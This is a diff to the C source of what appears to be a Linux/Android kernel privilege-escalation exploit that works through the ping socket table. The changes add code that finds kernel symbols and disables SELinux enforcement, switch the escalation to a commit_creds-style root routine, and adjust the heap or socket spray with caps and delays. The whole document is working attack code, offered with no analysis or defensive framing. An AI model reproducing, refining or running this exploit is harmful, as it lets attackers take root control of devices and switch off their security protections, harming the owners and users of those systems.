@@ -10,9 +10,9 @@
 
 
 #define MAX_CHILD 1024
-#define MAX_CHILD_SOCKS 65000
 #define MAX_MMAP 1024
 #define MAP_SIZE (4 * 1024 * 1024)
+#define MAX_SOCKS 60000
 
 #define SIOCGSTAMPNS 0x8907
 
@@ -28,6 +28,8 @@ int (*my_printk)(const char *fmt, ...) = 0;
 struct task_struct *(*my_find_task_by_pid_ns)(pid_t nr, struct pid_namespace *ns);
 struct files_struct *(*my_get_files_struct)(struct task_struct *task);
 
+void (*my_selnl_notify_setenforce)(int val);
+void (*my_selinux_status_update_setenforce)(int enforcing);
 extern unsigned long lookup_sym(const char *name);
 pid_t my_pid;
 struct file;
@@ -51,6 +53,21 @@ struct files_struct {
 };
 struct pid_namespace;
 
+static void shutdown_selinux()
+{
+	int *selinux_enforce = NULL;
+
+	selinux_enforce = lookup_sym("selinux_enforcing");
+	my_selnl_notify_setenforce = lookup_sym("selnl_notify_setenforce");
+	my_selinux_status_update_setenforce = lookup_sym("selinux_status_update_setenforce");
+	if (selinux_enforce && *selinux_enforce == 1) {
+		*selinux_enforce = 0;
+		my_selnl_notify_setenforce(0);
+		my_selinux_status_update_setenforce(0);
+
+	}
+}
+
 static int call_back()
 {
         int tmp;
@@ -60,16 +77,18 @@ static int call_back()
         struct ping_table *pt;
 	int first = 0;
 
-	my_pid = getpid();
         my_printk = lookup_sym("printk");
         my_find_task_by_pid_ns = lookup_sym("find_task_by_pid_ns");
         my_get_files_struct = lookup_sym("get_files_struct");
         ns = lookup_sym("init_pid_ns");
         my_printk("GOT in kernel!\n");
 
+	shutdown_selinux();
+
         pt = lookup_sym("ping_table");
 
-        root_by_set_cred();
+        //root_by_set_cred();
+	root_by_commit_cred();
 
         fs = my_get_files_struct(my_find_task_by_pid_ns(my_pid, ns));
         struct fdtable *fdt  =  fs->fdt;
@@ -90,17 +109,6 @@ static int call_back()
         /*         pt->hash[i].first = (i << 1) + 1; */
         /* } */
         
-        /*
-        for(i = PING_PAD; i < PING_MAX; i++) {
-                if (fds_close[i - PING_PAD] == 0) {
-                        //printf("close sockfd %d\n", i);
-                        close(fds[i]);
-                }
-        }
-        */
-
-        /* struct thread_info_part *thread_info = (unsigned long)&tmp & ~0x1fff; */
-        /* thread_info->addr_limit = 0; */
 
         return 0;
 }
@@ -425,6 +433,7 @@ int main()
                 *target = call_back;
         }
 
+	my_pid = getpid();
 
 	max_fds = maximize_fd_limit();
 	printf("max_fds = %d\n", max_fds);
@@ -437,6 +446,8 @@ int main()
 	total_child_socks = 0;
 	for (i = 0; i < MAX_CHILD; i++) {
 
+		if (total_child_socks > MAX_SOCKS)
+			break;
 		
 		pid[i] = create_child(&pipe_read[i], max_fds, &child_socks);
 
@@ -454,8 +465,11 @@ int main()
 				break;
 			num_socks++;
 		}
+
+		usleep(500000);
 	}
 	num_child = i;
+	printf("total child sockets: %d\n", total_child_socks);
 	printf("\nchild num: %d\n", num_child);
 
 	socks[num_socks] = -1;
